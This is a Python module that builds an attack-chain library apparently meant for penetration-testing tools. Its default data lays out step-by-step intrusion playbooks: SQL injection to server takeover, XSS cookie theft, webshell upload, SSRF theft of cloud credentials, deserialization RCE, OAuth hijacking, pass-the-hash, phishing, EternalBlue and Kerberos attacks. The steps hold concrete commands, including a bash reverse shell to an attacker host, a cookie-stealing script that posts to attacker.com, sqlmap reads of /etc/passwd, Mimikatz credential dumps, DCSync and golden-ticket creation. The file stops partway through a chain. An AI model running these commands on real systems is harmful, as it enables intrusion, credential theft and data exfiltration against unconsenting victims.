#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
attack_chains知识库模块，存储和管理相关安全知识、漏洞信息和攻击链数据。

模块功能：
    - 提供相关安全测试功能
    - 支持API调用和命令行使用
    - 与其他模块集成协作

注意事项：
    - 本模块仅用于授权的安全测试
    - 请勿用于非法用途
    - 使用前请确保已获得相关授权
"""
import json
import os
import time
import uuid
from typing import Any, Dict, List, Optional
from dataclasses import dataclass, field
from collections import Counter

from utils.logger import log


@dataclass
class AttackStep:
    """攻击步骤"""
    step_number: int
    name: str
    description: str
    technique: str = ""  # MITRE ATT&CK技术编号
    tools: List[str] = field(default_factory=list)
    commands: List[str] = field(default_factory=list)
    expected_result: str = ""
    success_indicators: List[str] = field(default_factory=list)
    failure_indicators: List[str] = field(default_factory=list)
    notes: str = ""

    def to_dict(self) -> Dict[str, Any]:
        """执行相关操作。

        Returns:
            操作结果。
        """
        return {
            "step_number": self.step_number,
            "name": self.name,
            "description": self.description,
            "technique": self.technique,
            "tools": self.tools,
            "commands": self.commands,
            "expected_result": self.expected_result,
            "success_indicators": self.success_indicators,
            "failure_indicators": self.failure_indicators,
            "notes": self.notes
        }


@dataclass
class AttackChain:
    """攻击链"""
    chain_id: str
    name: str
    description: str
    category: str  # web/internal/cloud/mobile/iot/social_engineering
    severity: str  # critical/high/medium/low
    prerequisites: List[str] = field(default_factory=list)
    target_types: List[str] = field(default_factory=list)
    steps: List[AttackStep] = field(default_factory=list)
    mitre_phases: List[str] = field(default_factory=list)  # MITRE ATT&CK阶段
    estimated_time: str = ""  # 预计耗时
    success_rate: str = ""  # 成功率估计
    detection_difficulty: str = ""  # 检测难度
    remediation: str = ""
    references: List[str] = field(default_factory=list)
    tags: List[str] = field(default_factory=list)
    created_at: float = field(default_factory=time.time)
    updated_at: float = field(default_factory=time.time)

    def to_dict(self) -> Dict[str, Any]:
        """执行相关操作。

        Returns:
            操作结果。
        """
        return {
            "chain_id": self.chain_id,
            "name": self.name,
            "description": self.description,
            "category": self.category,
            "severity": self.severity,
            "prerequisites": self.prerequisites,
            "target_types": self.target_types,
            "steps_count": len(self.steps),
            "steps": [s.to_dict() for s in self.steps],
            "mitre_phases": self.mitre_phases,
            "estimated_time": self.estimated_time,
            "success_rate": self.success_rate,
            "detection_difficulty": self.detection_difficulty,
            "remediation": self.remediation,
            "references": self.references,
            "tags": self.tags,
            "created_at": self.created_at,
            "updated_at": self.updated_at
        }


class AttackChainLibrary:
    """攻击链库"""

    def __init__(self, data_dir: str = "data/knowledge/attack_chains"):
        """初始化AttackChainLibrary实例。

        Args:
            self: 类实例。
        """
        self.data_dir = data_dir
        self.chains: Dict[str, AttackChain] = {}
        os.makedirs(data_dir, exist_ok=True)
        self._load_chains()
        if not self.chains:
            self._init_default_chains()

    def _load_chains(self):
        """从文件加载攻击链"""
        chains_file = os.path.join(self.data_dir, "attack_chains.json")
        if os.path.exists(chains_file):
            try:
                with open(chains_file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                for cid, cdata in data.items():
                    steps = []
                    for sdata in cdata.get("steps", []):
                        steps.append(AttackStep(
                            step_number=sdata["step_number"],
                            name=sdata["name"],
                            description=sdata.get("description", ""),
                            technique=sdata.get("technique", ""),
                            tools=sdata.get("tools", []),
                            commands=sdata.get("commands", []),
                            expected_result=sdata.get("expected_result", ""),
                            success_indicators=sdata.get("success_indicators", []),
                            failure_indicators=sdata.get("failure_indicators", []),
                            notes=sdata.get("notes", "")
                        ))
                    self.chains[cid] = AttackChain(
                        chain_id=cdata["chain_id"],
                        name=cdata["name"],
                        description=cdata.get("description", ""),
                        category=cdata.get("category", "web"),
                        severity=cdata.get("severity", "high"),
                        prerequisites=cdata.get("prerequisites", []),
                        target_types=cdata.get("target_types", []),
                        steps=steps,
                        mitre_phases=cdata.get("mitre_phases", []),
                        estimated_time=cdata.get("estimated_time", ""),
                        success_rate=cdata.get("success_rate", ""),
                        detection_difficulty=cdata.get("detection_difficulty", ""),
                        remediation=cdata.get("remediation", ""),
                        references=cdata.get("references", []),
                        tags=cdata.get("tags", [])
                    )
            except Exception as e:
                log.error(f"加载攻击链失败: {e}")

    def _save_chains(self):
        """保存攻击链到文件"""
        chains_file = os.path.join(self.data_dir, "attack_chains.json")
        try:
            data = {cid: c.to_dict() for cid, c in self.chains.items()}
            with open(chains_file, 'w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False, indent=2, default=str)
        except Exception as e:
            log.error(f"保存攻击链失败: {e}")

    def _add_chain(self, **kwargs):
        """添加攻击链"""
        chain_id = f"chain-{uuid.uuid4().hex[:8]}"
        chain = AttackChain(chain_id=chain_id, **kwargs)
        self.chains[chain_id] = chain
        return chain_id

    def _init_default_chains(self):
        """初始化20个默认攻击链"""
        log.info("初始化20个默认攻击链...")

        # ===== Web攻击链（6个） =====
        self._add_chain(
            name="SQL注入到服务器控制",
            description="从SQL注入漏洞开始，逐步获取数据库权限、文件读写、最终获取服务器权限",
            category="web",
            severity="critical",
            prerequisites=["存在SQL注入漏洞", "数据库用户有文件读写权限", "服务器配置允许"],
            target_types=["web应用", "API接口"],
            mitre_phases=["初始访问", "执行", "持久化", "权限提升", "凭据访问", "发现", "横向移动", "收集", "数据外泄"],
            estimated_time="2-4小时",
            success_rate="中等（取决于数据库权限和服务器配置）",
            detection_difficulty="中等（SQL注入和异常文件访问可检测）",
            remediation="使用参数化查询，最小权限数据库账户，禁用文件读写权限，WAF检测SQL注入",
            steps=[
                AttackStep(1, "发现SQL注入点", "通过扫描或手动测试发现存在SQL注入的参数", "T1190", ["sqlmap", "Burp Suite"], ["sqlmap -u 'http://target/vuln.php?id=1' --batch"], "确认存在SQL注入", ["参数被修改后页面变化", "sqlmap识别注入类型"], ["参数无变化", "WAF拦截"]),
                AttackStep(2, "获取数据库信息", "枚举数据库名、表名、列名", "T1003", ["sqlmap"], ["sqlmap -u '...' --dbs --batch", "sqlmap -u '...' -D dbname --tables --batch"], "获取数据库结构", ["列出数据库名", "列出表名"], ["权限不足", "空数据库"]),
                AttackStep(3, "提取敏感数据", "提取用户凭证、API密钥等敏感数据", "T1003", ["sqlmap"], ["sqlmap -u '...' -D db -T users --dump --batch"], "获取用户密码哈希", ["输出用户表数据", "密码哈希"], ["表为空", "加密存储"]),
                AttackStep(4, "文件读写", "利用SQL注入读取系统文件或写入Webshell", "T1005", ["sqlmap"], ["sqlmap -u '...' --file-read=/etc/passwd --batch", "sqlmap -u '...' --file-write=shell.php --file-dest=/var/www/html/shell.php --batch"], "成功读取文件或写入Webshell", ["文件内容输出", "Webshell可访问"], ["权限不足", "路径不可写"]),
                AttackStep(5, "获取服务器权限", "通过Webshell执行命令，获取反向shell", "T1059", ["webshell", "nc"], ["在Webshell中执行bash -i >& /dev/tcp/attacker/4444 0>&1"], "获得服务器命令行权限", ["反向shell连接成功", "命令执行输出"], ["防火墙拦截", "权限受限"]),
                AttackStep(6, "权限提升和持久化", "提升到root权限，设置持久化后门", "T1068", ["linux-exploit-suggester", "cron"], ["查找内核漏洞并利用", "添加cron任务持久化"], "获得root权限和持久化访问", ["id显示root", "重启后仍可访问"], ["无可用提权漏洞", "安全配置"]),
            ],
            tags=["sql_injection", "webshell", "privilege_escalation", "rce", "data_exfiltration"]
        )

        self._add_chain(
            name="XSS到账户接管",
            description="从反射型/存储型XSS开始，窃取用户Cookie和会话，最终接管用户账户",
            category="web",
            severity="high",
            prerequisites=["存在XSS漏洞", "用户会访问恶意链接/页面", "Cookie未设置HttpOnly"],
            target_types=["Web应用", "论坛", "评论系统"],
            mitre_phases=["初始访问", "执行", "凭据访问", "收集", "横向移动"],
            estimated_time="1-2小时（构造payload+等待用户点击）",
            success_rate="高（存储型XSS）/ 中等（反射型XSS）",
            detection_difficulty="低（XSS payload和异常Cookie使用可检测）",
            remediation="对输出进行HTML编码，设置HttpOnly和Secure Cookie，使用CSP，检测XSS payload",
            steps=[
                AttackStep(1, "发现XSS漏洞", "发现反射型或存储型XSS注入点", "T1190", ["Burp Suite", "XSStrike"], ["XSStrike -u 'http://target/search?q=test'"], "确认存在XSS", ["payload在页面执行", "弹窗"], ["输出被编码", "CSP拦截"]),
                AttackStep(2, "构造Cookie窃取payload", "构造窃取Cookie并发送到攻击者服务器的XSS payload", "T1059", ["自定义JS"], ["<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>"], "payload可执行并发送Cookie", ["攻击者服务器收到Cookie", "Cookie值完整"], ["HttpOnly阻止访问", "CSP拦截"]),
                AttackStep(3, "诱导用户访问", "通过钓鱼邮件/私信/评论诱导用户访问恶意链接", "T1566", ["社会工程学"], ["发送包含恶意链接的邮件/消息"], "用户点击链接并触发XSS", ["用户访问记录", "Cookie被窃取"], ["用户未点击", "链接被拦截"]),
                AttackStep(4, "使用窃取的Cookie登录", "替换浏览器Cookie，以受害者身份登录", "T1078", ["浏览器开发者工具", "Cookie Editor"], ["在浏览器中设置窃取的Cookie", "刷新页面"], "成功登录受害者账户", ["显示受害者用户名", "访问受害者数据"], ["Cookie过期", "会话失效"]),
                AttackStep(5, "账户接管和数据窃取", "修改账户信息、窃取个人数据、进行进一步攻击", "T1005", ["浏览器"], ["查看/导出账户数据", "修改邮箱/密码"], "完全控制账户", ["数据导出成功", "密码修改成功"], ["需要二次验证", "异常登录检测"]),
            ],
            tags=["xss", "cookie_theft", "session_hijacking", "account_takeover", "phishing"]
        )

        self._add_chain(
            name="文件上传到Webshell",
            description="从文件上传漏洞开始，上传Webshell，最终获取服务器权限",
            category="web",
            severity="critical",
            prerequisites=["存在文件上传功能", "上传过滤不严", "上传目录可Web访问"],
            target_types=["头像上传", "附件上传", "文档上传"],
            mitre_phases=["初始访问", "执行", "持久化", "权限提升"],
            estimated_time="30分钟-1小时",
            success_rate="高（过滤不严的情况下）",
            detection_difficulty="中等（异常文件上传和Webshell访问可检测）",
            remediation="白名单验证文件类型，重命名文件，存储在非Web目录，禁用上传目录脚本执行",
            steps=[
                AttackStep(1, "发现文件上传功能", "识别文件上传入口和过滤机制", "T1190", ["Burp Suite"], ["拦截上传请求，分析过滤规则"], "确认上传功能和过滤方式", ["上传请求可拦截", "Content-Type/扩展名验证"], ["无上传功能", "严格白名单"]),
                AttackStep(2, "绕过上传过滤", "通过修改Content-Type/文件头/扩展名等方式绕过过滤", "T1036", ["Burp Suite", "GIF89a"], ["修改Content-Type为image/gif", "文件头添加GIF89a", "使用.php5/.phtml扩展名"], "文件上传成功", ["返回上传成功", "文件路径可访问"], ["文件被拒绝", "文件被删除"]),
                AttackStep(3, "上传Webshell", "上传包含PHP/ASP代码的Webshell文件", "T1505", ["weevely", "自定义Webshell"], ["weevely generate password shell.php", "上传shell.php"], "Webshell上传成功并可访问", ["访问shell.php返回200", "Webshell响应"], ["脚本不执行", "文件被清除"]),
                AttackStep(4, "连接Webshell执行命令", "使用Webshell客户端连接，执行系统命令", "T1059", ["weevely", "蚁剑", "菜刀"], ["weevely http://target/shell.php password"], "获得命令执行权限", ["命令执行输出", "当前用户信息"], ["权限受限", "命令被禁用"]),
                AttackStep(5, "获取反向shell", "通过Webshell获取交互式反向shell", "T1059", ["nc", "bash"], ["bash -i >& /dev/tcp/attacker/4444 0>&1"], "获得交互式shell", ["反向shell连接", "命令提示符"], ["防火墙拦截", "无bash"]),
                AttackStep(6, "权限提升和持久化", "提升权限并设置持久化访问", "T1068", ["linux-exploit-suggester"], ["查找并利用提权漏洞", "添加SSH公钥/cron任务"], "获得高权限和持久化", ["id显示root", "持久化成功"], ["无提权漏洞", "安全配置"]),
            ],
            tags=["file_upload", "webshell", "rce", "privilege_escalation", "persistence"]
        )

        self._add_chain(
            name="SSRF到云凭证窃取",
            description="从SSRF漏洞开始，访问云元数据API，窃取云服务器凭证",
            category="web",
            severity="critical",
            prerequisites=["存在SSRF漏洞", "目标运行在云服务器上", "元数据API可访问"],
            target_types=["云服务器", "URL获取功能", "图片代理"],
            mitre_phases=["初始访问", "发现", "凭据访问", "数据外泄"],
            estimated_time="30分钟-1小时",
            success_rate="高（AWS IMDSv1）/ 中等（IMDSv2）",
            detection_difficulty="中等（异常元数据API访问可检测）",
            remediation="限制SSRF可访问的URL，禁止访问内网和元数据IP，使用IMDSv2，最小权限IAM角色",
            steps=[
                AttackStep(1, "发现SSRF漏洞", "发现服务器端请求伪造漏洞点", "T1190", ["Burp Suite", "SSRFmap"], ["SSRFmap -u 'http://target/fetch?url=http://127.0.0.1'"], "确认SSRF存在", ["访问127.0.0.1有响应", "端口扫描差异"], ["URL白名单", "禁止内网"]),
                AttackStep(2, "探测云服务商", "通过元数据API判断云服务商", "T1016", ["curl"], ["url=http://169.254.169.254/latest/meta-data/ (AWS)", "url=http://169.254.169.254/metadata/v1/ (DigitalOcean)"], "确认云服务商", ["元数据API响应", "实例信息"], ["非云环境", "元数据禁用"]),
                AttackStep(3, "获取IAM角色名", "枚举IAM安全凭证角色", "T1003", ["curl"], ["url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"], "获取IAM角色名", ["列出角色名", "角色名返回"], ["无IAM角色", "权限不足"]),
                AttackStep(4, "窃取临时凭证", "获取AccessKeyId/SecretAccessKey/SessionToken", "T1003", ["curl"], ["url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"], "获取临时凭证", ["AccessKeyId", "SecretAccessKey", "Token"], ["凭证过期", "无权限"]),
                AttackStep(5, "使用凭证访问云服务", "使用窃取的凭证访问AWS API", "T1078", ["aws cli"], ["aws configure set aws_access_key_id KEY", "aws s3 ls", "aws ec2 describe-instances"], "获得云服务访问权限", ["列出S3存储桶", "列出EC2实例"], ["凭证无效", "权限受限"]),
                AttackStep(6, "数据窃取和权限提升", "窃取S3数据，尝试提升权限", "T1005", ["aws cli"], ["aws s3 cp s3://bucket/data ./data", "尝试创建新IAM用户"], "窃取敏感数据，可能提升权限", ["数据下载成功", "权限提升成功"], ["数据加密", "权限最小化"]),
            ],
            tags=["ssrf", "cloud", "aws", "metadata", "credential_theft", "data_exfiltration"]
        )

        self._add_chain(
            name="反序列化到RCE",
            description="从反序列化漏洞开始，构造恶意序列化数据，最终远程代码执行",
            category="web",
            severity="critical",
            prerequisites=["存在反序列化漏洞", "存在可利用的POP链/Gadget", "目标使用存在漏洞的库"],
            target_types=["Java应用", "PHP应用", "Python应用", ".NET应用"],
            mitre_phases=["初始访问", "执行", "持久化", "权限提升"],
            estimated_time="1-3小时（取决于POP链构造难度）",
            success_rate="中等（需要找到可用的Gadget链）",
            detection_difficulty="中等（异常反序列化数据和进程行为可检测）",
            remediation="避免反序列化不可信数据，使用白名单限制类，升级存在漏洞的库，使用安全的序列化格式",
            steps=[
                AttackStep(1, "发现反序列化入口", "识别反序列化用户可控数据的入口", "T1190", ["Burp Suite", "ysoserial"], ["拦截请求，寻找序列化数据（base64/二进制）"], "确认反序列化入口", ["请求包含序列化数据", "Cookie/参数包含对象"], ["无反序列化", "安全的反序列化"]),
                AttackStep(2, "识别目标技术栈和库", "识别编程语言、框架、使用的库版本", "T1016", ["Burp Suite", "错误信息"], ["触发错误，查看栈信息", "分析响应头和错误信息"], "确认技术栈和库版本", ["Java/PHP/Python标识", "库版本信息"], ["信息不足", "自定义序列化"]),
                AttackStep(3, "查找可用Gadget链", "查找目标库中存在的反序列化Gadget链", "T1587", ["ysoserial", "PHPGGC", "GitHub"], ["ysoserial -l 列出可用Gadget", "查找对应库版本的利用链"], "找到可用的Gadget链", ["ysoserial支持该库", "公开的POC"], ["无可用Gadget", "库已修复"]),
                AttackStep(4, "构造恶意序列化数据", "使用工具构造执行命令的序列化payload", "T1587", ["ysoserial", "PHPGGC"], ["ysoserial CommonsCollections1 'id' > payload.ser", "phpggc -u Laravel/RCE1 system id"], "生成恶意序列化数据", ["payload生成成功", "base64编码完成"], ["工具不支持", "构造失败"]),
                AttackStep(5, "发送payload触发RCE", "将恶意序列化数据发送到目标，触发反序列化", "T1203", ["Burp Suite", "curl"], ["替换请求中的序列化数据", "发送请求"], "远程代码执行成功", ["命令执行输出", "id命令结果", "DNS/HTTP外带"], ["payload无效", "Gadget不可用"]),
                AttackStep(6, "获取反向shell和持久化", "通过RCE获取反向shell，设置持久化", "T1059", ["nc", "bash"], ["执行反弹shell命令", "添加持久化后门"], "获得服务器控制权限", ["反向shell连接", "持久化成功"], ["命令执行受限", "防火墙拦截"]),
            ],
            tags=["deserialization", "rce", "java", "php", "ysoserial", "gadget_chain"]
        )

        self._add_chain(
            name="OAuth配置错误到账户接管",
            description="从OAuth配置错误开始，窃取授权码/Token，最终接管用户账户",
            category="web",
            severity="high",
            prerequisites=["使用OAuth登录", "redirect_uri验证不严", "state参数缺失或可预测"],
            target_types=["OAuth登录", "SSO", "第三方登录"],
            mitre_phases=["初始访问", "凭据访问", "账户接管"],
            estimated_time="1-2小时",
            success_rate="中等（取决于配置错误程度）",
            detection_difficulty="低（异常OAuth流程可检测）",
            remediation="严格验证redirect_uri，使用state参数，设置授权码过期时间，绑定redirect_uri和client_id",
            steps=[
                AttackStep(1, "识别OAuth登录流程", "分析OAuth授权流程和参数", "T1587", ["Burp Suite"], ["拦截OAuth登录请求", "分析client_id/redirect_uri/state"], "确认OAuth流程", ["授权请求可拦截", "参数完整"], ["无OAuth", "安全配置"]),
                AttackStep(2, "测试redirect_uri绕过", "测试redirect_uri验证是否严格", "T1587", ["Burp Suite"], ["redirect_uri=https://attacker.com", "redirect_uri=https://trusted.com@attacker.com", "redirect_uri=https://trusted.com.attacker.com"], "发现redirect_uri绕过", ["授权码发送到攻击者域名", "302跳转到攻击者"], ["严格白名单", "验证正确"]),
                AttackStep(3, "测试state参数", "检查state参数是否存在且不可预测", "T1587", ["Burp Suite"], ["移除state参数", "使用固定/可预测的state"], "发现state缺陷", ["无state也能完成授权", "state可预测"], ["state验证正确", "随机state"]),
                AttackStep(4, "构造恶意授权链接", "构造包含恶意redirect_uri的授权链接", "T1587", ["自定义"], ["https://target/oauth/authorize?client_id=xxx&redirect_uri=https://attacker.com&response_type=code&state=xxx"], "构造恶意链接成功", ["链接格式正确", "包含恶意redirect_uri"], ["参数错误", "client_id无效"]),
                AttackStep(5, "诱导用户授权", "通过钓鱼诱导用户点击恶意链接并授权", "T1566", ["社会工程学"], ["发送钓鱼邮件/消息", "诱导用户点击并授权"], "用户授权成功", ["用户点击链接", "授权页面显示正常"], ["用户未授权", "链接被拦截"]),
                AttackStep(6, "窃取授权码并换取Token", "接收授权码，使用授权码换取access_token", "T1003", ["curl"], ["在attacker.com接收code参数", "POST /oauth/token换取access_token"], "获得用户access_token", ["access_token返回", "Token有效"], ["授权码过期", "Token无效"]),
                AttackStep(7, "使用Token接管账户", "使用access_token访问用户API，接管账户", "T1078", ["curl", "Postman"], ["GET /api/user/profile", "修改用户邮箱/密码"], "完全控制用户账户", ["用户数据返回", "账户信息修改成功"], ["Token权限受限", "需要二次验证"]),
            ],
            tags=["oauth", "redirect_uri", "account_takeover", "phishing", "token_theft"]
        )

        # ===== 内网攻击链（5个） =====
        self._add_chain(
            name="内网横向移动-哈希传递",
            description="从获取一台机器权限开始，通过哈希传递横向移动到其他机器",
            category="internal",
            severity="critical",
            prerequisites=["已获得内网一台机器的权限", "获取到用户NTLM哈希", "目标机器开放SMB(445)端口"],
            target_types=["Windows域环境", "工作组环境"],
            mitre_phases=["凭据访问", "发现", "横向移动", "执行", "持久化"],
            estimated_time="1-2小时",
            success_rate="高（Windows域环境常见）",
            detection_difficulty="中等（异常SMB登录和进程创建可检测）",
            remediation="启用LSA保护，禁用NTLM，使用强密码，限制管理员登录，监控异常SMB登录",
            steps=[
                AttackStep(1, "获取初始权限", "通过Webshell/钓鱼/漏洞利用获得初始机器权限", "T1190", ["webshell", "metasploit"], ["执行命令获取shell"], "获得初始机器命令行权限", ["shell连接成功", "命令执行"], ["无初始访问", "权限不足"]),
                AttackStep(2, "转储用户凭证", "使用Mimikatz等工具转储内存中的用户NTLM哈希", "T1003", ["Mimikatz", "ProcDump"], ["mimikatz # privilege::debug", "mimikatz # sekurlsa::logonpasswords"], "获取用户NTLM哈希", ["输出用户哈希", "Administrator哈希"], ["权限不足", "LSA保护"]),
                AttackStep(3, "内网信息收集", "扫描内网存活主机和开放端口", "T1018", ["nmap", "PowerView"], ["nmap -sn 192.168.1.0/24", "net view"], "发现内网其他主机", ["存活主机列表", "域控信息"], ["网络隔离", "扫描被检测"]),
                AttackStep(4, "哈希传递横向移动", "使用获取的哈希通过Pass-the-Hash登录其他机器", "T1550", ["Impacket", "CrackMapExec"], ["psexec.py -hashes LMHASH:NTHASH user@target", "cme smb 192.168.1.0/24 -u user -H NTHASH"], "成功登录其他机器", ["命令执行成功", "获得shell"], ["哈希无效", "目标不可达"]),
                AttackStep(5, "获取域控权限", "通过哈希传递登录域控，获取域管理员权限", "T1078", ["Impacket", "Mimikatz"], ["psexec.py -hashes ... Administrator@DC", "mimikatz # lsadump::dcsync /domain:domain /user:Administrator"], "获得域控权限和所有用户哈希", ["DCSync成功", "所有用户哈希"], ["域控防护", "权限不足"]),
                AttackStep(6, "持久化和黄金票据", "创建黄金票据，设置持久化访问", "T1558", ["Mimikatz"], ["mimikatz # kerberos::golden /user:Administrator /domain:domain /sid:SID /krbtgt:KRBTGT_HASH /ptt"], "获得持久化域管理员权限", ["黄金票据创建成功", "任意用户身份访问"], ["krbtgt哈希变更", "检测到异常"]),
            ],
            tags=["internal", "pass_the_hash", "mimikatz", "lateral_movement", "domain_admin", "golden_ticket"]
        )

        self._add_chain(
            name="钓鱼到内网渗透",
            description="从钓鱼邮件开始，获取用户凭证，进入内网，逐步渗透",
            category="social_engineering",
            severity="critical",
            prerequisites=["目标组织员工信息", "钓鱼邮件能送达", "用户会点击链接/附件"],
            target_types=["企业员工", "高管", "IT管理员"],
            mitre_phases=["初始访问", "执行", "持久化", "权限提升", "凭据访问", "发现", "横向移动", "收集", "数据外泄"],
            estimated_time="1-7天（准备+等待+渗透）",
            success_rate="中等（取决于用户安全意识）",
            detection_difficulty="中等（钓鱼邮件和异常登录可检测）",
            remediation="安全意识培训，邮件网关过滤，MFA，最小权限，监控异常登录和横向移动",
            steps=[
                AttackStep(1, "信息收集和目标画像", "收集目标组织员工信息、技术栈、安全措施", "T1589", ["OSINT", "LinkedIn", "Hunter.io"], ["收集员工邮箱和职位", "分析目标使用的技术"], "获得目标员工信息", ["员工邮箱列表", "技术栈信息"], ["信息不足", "隐私保护"]),
                AttackStep(2, "构造钓鱼邮件", "构造逼真的钓鱼邮件和恶意附件/链接", "T1566", ["Social Engineering Toolkit", "自定义"], ["仿造内部通知/IT维护邮件", "嵌入恶意宏文档/钓鱼链接"], "钓鱼邮件构造完成", ["邮件内容逼真", "恶意附件/链接"], ["邮件被网关拦截", "内容不够逼真"]),
                AttackStep(3, "发送钓鱼邮件", "向目标员工发送钓鱼邮件", "T1566", ["邮件服务器", "邮件群发工具"], ["发送钓鱼邮件", "等待用户点击"], "钓鱼邮件发送成功", ["邮件送达", "用户打开"], ["邮件被拦截", "进入垃圾箱"]),
                AttackStep(4, "获取初始访问", "用户点击恶意链接/附件，获得初始shell", "T1204", ["Cobalt Strike", "Metasploit"], ["宏执行下载C2 beacon", "钓鱼页面窃取凭证"], "获得初始机器权限或凭证", ["beacon上线", "凭证窃取成功"], ["用户未执行", "宏被禁用"]),
                AttackStep(5, "内网信息收集", "在受控机器上收集内网信息和凭证", "T1087", ["PowerView", "Mimikatz", "BloodHound"], ["枚举域用户/组/计算机", "转储内存凭证", "分析域关系"], "获得内网拓扑和更多凭证", ["域信息输出", "用户哈希", "BloodHound图"], ["权限不足", "EDR检测"]),
                AttackStep(6, "横向移动", "使用获取的凭证横向移动到其他机器", "T1021", ["Impacket", "CrackMapExec", "RDP"], ["Pass-the-Hash登录其他机器", "RDP登录高价值目标"], "控制更多内网机器", ["多台机器受控", "访问关键服务器"], ["网络隔离", "检测到异常登录"]),
                AttackStep(7, "权限提升到域管", "通过漏洞/配置错误提升到域管理员权限", "T1068", ["BloodHound", "Mimikatz", "Rubeus"], ["分析BloodHound找到提权路径", "利用ACL错误/委派配置", "DCSync获取所有哈希"], "获得域管理员权限", ["域控访问成功", "DCSync成功"], ["路径不可达", "安全配置正确"]),
                AttackStep(8, "数据窃取和持久化", "窃取敏感数据，设置长期持久化访问", "T1005", ["Cobalt Strike", "自定义"], ["打包并加密敏感数据", "通过DNS/HTTPS外带数据", "添加黄金票据/后门"], "完成数据窃取和持久化", ["数据外带成功", "持久化访问建立"], ["数据加密", "流量检测"]),
            ],
            tags=["phishing", "social_engineering", "internal", "lateral_movement", "domain_admin", "data_exfiltration"]
        )

        self._add_chain(
            name="永恒之蓝到域控",
            description="利用MS17-010永恒之蓝漏洞，从外网直接打到域控",
            category="internal",
            severity="critical",
            prerequisites=["目标开放445端口", "目标存在MS17-010漏洞", "目标未打补丁"],
            target_types=["Windows 7/2008/2012", "未打补丁的系统"],
            mitre_phases=["初始访问", "执行", "持久化", "权限提升", "横向移动"],
            estimated_time="30分钟-1小时",
            success_rate="高（未打补丁的系统）",
            detection_difficulty="高（漏洞利用流量和异常进程可检测）",
            remediation="安装MS17-010补丁，禁用SMBv1，防火墙限制445端口，EDR检测",
            steps=[
                AttackStep(1, "扫描MS17-010漏洞", "扫描目标是否存在MS17-010漏洞", "T1046", ["nmap", "Metasploit"], ["nmap -p445 --script smb-vuln-ms17-010 target", "use auxiliary/scanner/smb/smb_ms17_010"], "确认目标存在漏洞", ["VULNERABLE输出", "漏洞存在"], ["已打补丁", "端口关闭"]),
                AttackStep(2, "利用MS17-010获取shell", "使用永恒之蓝漏洞利用获取系统权限", "T1203", ["Metasploit", "EternalBlue"], ["use exploit/windows/smb/ms17_010_eternalblue", "set RHOSTS target", "exploit"], "获得目标系统权限", ["meterpreter会话", "SYSTEM权限"], ["利用失败", "系统崩溃"]),
                AttackStep(3, "信息收集和凭证转储", "收集系统信息，转储用户凭证", "T1003", ["Mimikatz", "Metasploit"], ["hashdump", "mimikatz sekurlsa::logonpasswords"], "获取本地用户哈希", ["用户哈希输出", "管理员哈希"], ["权限不足", "LSA保护"]),
                AttackStep(4, "内网扫描和横向移动", "扫描内网其他机器，利用相同漏洞横向移动", "T1018", ["nmap", "Metasploit"], ["扫描内网445端口", "批量利用MS17-010"], "控制多台内网机器", ["多台机器受控", "内网拓扑"], ["网络隔离", "已打补丁"]),
                AttackStep(5, "定位并攻击域控", "找到域控，利用漏洞或哈希传递攻击域控", "T1078", ["PowerView", "Mimikatz", "Impacket"], ["net group 'Domain Controllers' /domain", "psexec.py -hashes ... Administrator@DC"], "获得域控权限", ["域控shell", "域管理员权限"], ["域控已打补丁", "权限不足"]),
                AttackStep(6, "DCSync和持久化", "导出所有域用户哈希，设置持久化", "T1003", ["Mimikatz", "Impacket"], ["mimikatz lsadump::dcsync /domain:domain /all", "创建黄金票据"], "获得所有用户哈希和持久化访问", ["所有用户哈希", "黄金票据"], ["检测到DCSync", "krbtgt变更"]),
            ],
            tags=["ms17-010", "eternalblue", "windows", "lateral_movement", "domain_admin", "dcsync"]
        )

        self._add_chain(
            name="Kerberos攻击链",
            description="从Kerberos预认证攻击开始，逐步获取域管理员权限",
            category="internal",
            severity="critical",
            prerequisites=["域环境", "存在设置了不需要预认证的用户", "可访问域控88端口"],
            target_types=["Windows Active Directory域环境"],
            mitre_phases=["凭据访问", "发现", "横向移动", "权限提升"],
            estimated_time="1-2小时",
            success_rate="中等（需要存在配置错误的用户）",
            detection_difficulty="中等（异常Kerberos请求和TGT请求可检测）",
            remediation="启用预认证，使用强密码，监控异常Kerberos请求，定期轮换krbtgt密码",
            steps=[
                AttackStep(1, "枚举不需要预认证的用户", "查找设置了UF_DONT_REQUIRE_PREAUTH的用户", "T1069", ["Impacket", "Rubeus"], ["GetNPUsers.py domain/ -usersfile users.txt -format hashcat -outputfile hashes.txt", "Rubeus asreproast /format:hashcat /outfile:hashes.txt"], "获取AS-REP Roasting哈希", ["用户哈希输出", "hashcat格式"], ["无此类用户", "权限不足"]),
                AttackStep(2, "破解AS-REP哈希", "使用Hashcat破解获取的哈希", "T1110", ["hashcat"], ["hashcat -m 18200 hashes.txt rockyou.txt"], "破解出用户密码", ["密码破解成功", "明文密码"], ["密码强度高", "破解失败"]),
                AttackStep(3, "使用凭证登录", "使用破解的凭证登录域内机器", "T1078", ["Impacket", "RDP"], ["psexec.py domain/user:password@target", "xfreerdp /u:user /p:password /v:target"], "获得用户权限的shell", ["登录成功", "命令执行"], ["账户锁定", "权限不足"]),
                AttackStep(4, "Kerberoasting攻击服务账户", "请求服务账户的TGS并破解", "T1558", ["Impacket", "Rubeus"], ["GetUserSPNs.py domain/user:password -outputfile spn_hashes.txt", "Rubeus kerberoast /outfile:spn_hashes.txt"], "获取服务账户TGS哈希", ["SPN哈希输出", "服务账户名"], ["无服务账户", "密码强度高"]),
                AttackStep(5, "破解服务账户密码", "破解服务账户TGS哈希", "T1110", ["hashcat"], ["hashcat -m 13100 spn_hashes.txt rockyou.txt"], "破解出服务账户密码", ["密码破解成功", "服务账户凭证"], ["密码强度高", "破解失败"]),
                AttackStep(6, "使用服务账户提升权限", "使用高权限服务账户登录关键服务器", "T1078", ["Impacket", "Mimikatz"], ["psexec.py domain/service_account:password@server", "mimikatz sekurlsa::logonpasswords"], "获得服务器权限和更多凭证", ["服务器shell", "更多用户哈希"], ["服务账户权限低", "目标不可达"]),
                AttackStep(7, "DCSync或黄金票据", "获取域控权限，导出所有哈希", "T1003", ["Mimikatz", "Impacket"], ["mimikatz lsadump::dcsync /domain:domain /all", "secretsdump.py domain/admin:password@DC"], "获得所有域用户哈希", ["所有用户哈希", "krbtgt哈希"], ["权限不足", "检测到DCSync"]),
            ],
